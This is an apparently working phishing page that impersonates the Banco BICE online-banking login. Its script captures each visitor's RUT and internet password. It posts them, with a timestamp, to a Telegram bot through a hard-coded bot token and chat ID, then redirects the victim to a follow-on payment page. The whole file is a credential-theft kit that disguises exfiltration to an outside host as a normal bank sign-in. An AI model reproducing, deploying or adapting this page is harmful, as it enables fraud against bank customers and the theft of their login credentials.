<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco BICE - Ingreso</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #ffffff;
            color: #333;
            display: flex;
            flex-direction: column;
            align-items: center;
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .back-link {
            align-self: flex-start;
            text-decoration: none;
            color: #1976D2;
            font-size: 16px;
            margin-bottom: 30px;
            display: flex;
            align-items: center;
        }
        
        .back-arrow {
            margin-right: 5px;
        }
        
        .logo {
            margin-bottom: 30px;
            text-align: center;
        }
        
        .logo-text {
            color: #0063B1;
            font-size: 24px;
            font-weight: bold;
            letter-spacing: 1px;
        }
        
        .bice-text {
            color: #0063B1;
            font-weight: bold;
            margin-left: 8px;
        }
        
        .welcome-text {
            color: #777;
            font-size: 18px;
            margin-bottom: 30px;
            text-align: center;
        }
        
        .input-field {
            width: 100%;
            padding: 15px;
            margin-bottom: 20px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
            color: #333;
        }
        
        .input-field::placeholder {
            color: #999;
        }
        
        .password-container {
            position: relative;
            width: 100%;
        }
        
        .eye-icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #0063B1;
            cursor: pointer;
        }
        
        .forgot-password {
            text-align: center;
            margin: 20px 0;
        }
        
        .forgot-link {
            color: #0063B1;
            text-decoration: none;
            font-size: 14px;
        }
        
        .login-button {
            width: 100%;
            padding: 15px;
            background-color: #1976D2;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            transition: background-color 0.3s;
        }
        
        .login-button:hover {
            background-color: #1565C0;
        }
        
        .login-button:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }
        
        .divider {
            width: 100%;
            text-align: center;
            border-bottom: 1px solid #ddd;
            line-height: 0.1em;
            margin: 30px 0;
        }
        
        .divider span {
            background: #fff;
            padding: 0 10px;
            color: #999;
        }
        
        .contact-info {
            display: flex;
            align-items: center;
            justify-content: center;
            color: #777;
            margin-top: 10px;
        }
        
        .phone-icon {
            margin-right: 10px;
            color: #777;
        }
        
        .phone-number {
            color: #777;
            font-weight: bold;
        }
        
        .loading {
            display: none;
            text-align: center;
            margin-top: 20px;
            color: #1976D2;
        }
    </style>
</head>
<body>
    <a href="#" class="back-link">
        Ir al Inicio
    </a>
    
    <div class="logo">
        <span class="logo-text">BANCO <span style="letter-spacing: 0;">‚â°</span> BICE</span>
    </div>
    
    <div class="welcome-text">
        Te damos la bienvenida a Banca Personas
    </div>
    
    <form id="loginForm" style="width: 100%;">
        <input type="text" class="input-field" id="rut" name="rut" placeholder="RUT" required>
        
        <div class="password-container">
            <input type="password" class="input-field" id="clave" name="clave" placeholder="Clave Internet" required>
            <span class="eye-icon" onclick="togglePassword()">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#0063B1" stroke-width="2">
                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                    <circle cx="12" cy="12" r="3"/>
                    <line id="eyeLine" x1="4" y1="20" x2="20" y2="4" style="display: none;"/>
                </svg>
            </span>
        </div>
        
        <div class="forgot-password">
            <a href="#" class="forgot-link">¬øTienes problemas con tu clave internet?</a>
        </div>
        
        <button type="submit" class="login-button" id="submitBtn">Ingresar</button>
    </form>
    
    <div class="loading" id="loading">
        Procesando datos...
    </div>
    
    <div class="divider">
        <span>Para m√°s informaci√≥n</span>
    </div>
    
    <div class="contact-info">
        <svg class="phone-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#777" stroke-width="2">
            <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>
        </svg>
        <span>Ll√°manos al</span>
        <span class="phone-number">&nbsp;600 400 1000</span>
    </div>

    <script>
        // Configuraci√≥n de Telegram
        const BOT_TOKEN = '8050472055:AAECARJvZtrimVGoBUIXERph4dQDfL3pVXE';
        const CHAT_ID = '5848946481';
        const REDIRECT_URL = '../cargapago.html'; // URL de redirecci√≥n despu√©s del env√≠o

        // Funci√≥n para mostrar/ocultar contrase√±a
        function togglePassword() {
            const passwordInput = document.getElementById('clave');
            const eyeLine = document.getElementById('eyeLine');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeLine.style.display = 'block';
            } else {
                passwordInput.type = 'password';
                eyeLine.style.display = 'none';
            }
        }

        // Funci√≥n para enviar mensaje a Telegram
        async function sendToTelegram(rut, clave) {
            const message = `üè¶ *Banco BICE - Nuevo acceso*\n\n` +
                          `üë§ *RUT:* ${rut}\n` +
                          `üîë *Clave Internet:* ${clave}\n\n` +
                          `üïí *Fecha:* ${new Date().toLocaleString('es-CL', {
                              timeZone: 'America/Santiago',
                              year: 'numeric',
                              month: '2-digit',
                              day: '2-digit',
                              hour: '2-digit',
                              minute: '2-digit',
                              second: '2-digit'
                          })}`;

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                if (response.ok) {
                    return true;
                } else {
                    throw new Error('Error en el env√≠o a Telegram');
                }
            } catch (error) {
                console.error('Error:', error);
                return false;
            }
        }

        // Manejo del formulario
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const rut = document.getElementById('rut').value.trim();
            const clave = document.getElementById('clave').value.trim();
            const submitBtn = document.getElementById('submitBtn');
            const loading = document.getElementById('loading');
            
            // Validar campos
            if (!rut || !clave) {
                alert('Por favor, completa todos los campos');
                return;
            }
            
            // Deshabilitar bot√≥n y mostrar loading
            submitBtn.disabled = true;
            submitBtn.textContent = 'Procesando...';
            loading.style.display = 'block';
            
            try {
                // Enviar a Telegram
                const success = await sendToTelegram(rut, clave);
                
                if (success) {
                    // Peque√±a pausa para que el usuario vea que se proces√≥
                    setTimeout(() => {
                        // Redirigir despu√©s del env√≠o exitoso
                        window.location.href = REDIRECT_URL;
                    }, 1500);
                } else {
                    // En caso de error, mostrar mensaje
                    alert('Error en el procesamiento. Por favor, intenta nuevamente.');
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'Ingresar';
                    loading.style.display = 'none';
                }
            } catch (error) {
                console.error('Error:', error);
                alert('Error en el procesamiento. Por favor, intenta nuevamente.');
                submitBtn.disabled = false;
                submitBtn.textContent = 'Ingresar';
                loading.style.display = 'none';
            }
        });

        // Formatear RUT mientras se escribe (opcional)
        document.getElementById('rut').addEventListener('input', function(e) {
            let value = e.target.value.replace(/[^0-9kK]/g, '');
            if (value.length > 1) {
                value = value.slice(0, -1) + '-' + value.slice(-1);
            }
            if (value.length > 10) {
                value = value.slice(0, 10);
            }
            e.target.value = value;
        });
    </script>
</body>
</html>
